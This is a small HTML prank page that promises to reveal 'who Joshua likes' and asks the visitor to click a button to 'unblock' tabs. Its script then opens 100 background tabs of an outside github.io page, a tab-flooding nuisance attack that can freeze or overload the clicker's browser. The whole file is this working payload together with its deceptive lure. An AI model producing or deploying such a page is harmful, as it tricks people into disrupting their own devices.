<!DOCTYPE html>
<html>
<head>
    <title>Open Multiple Tabs</title>
    <style>
        body {
            background-image: url('https://i.imgur.com/9GcrldH.jpg');
            background-repeat: no-repeat;
            background-size: cover;
        }

        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            text-align: center;
            font-size: 24px;
            color: white;
            font-weight: bold;
        }

        #overlay span {
            font-weight: normal;
        }
    </style>
    <script>
        var url = "https://jz1324.github.io/noice/";
        var tabCount = 100;
        var openedTabs = 0;

        function openMultipleTabs() {
            var tab = window.open(url, "_blank");
            tab.blur(); // Optional: Minimize focus changes
            tab.onload = function() {
                openedTabs++;
                if (openedTabs >= tabCount) {
                    tab.close(); // Optional: Close the last tab after all have loaded
                }
            };
        }

        function unblockTabs() {
            document.getElementById("overlay").style.display = "none";
            for (let i = 0; i < tabCount; i++) {
                openMultipleTabs();
            }
        }
    </script>
</head>
<body>
    <div id="overlay">
        <span>Who does Joshua like? Click the button to unblock the tabs from opening.</span>
        <br>
        <button onclick="unblockTabs()">Unblock Tabs</button>
    </div>
</body>
</html>
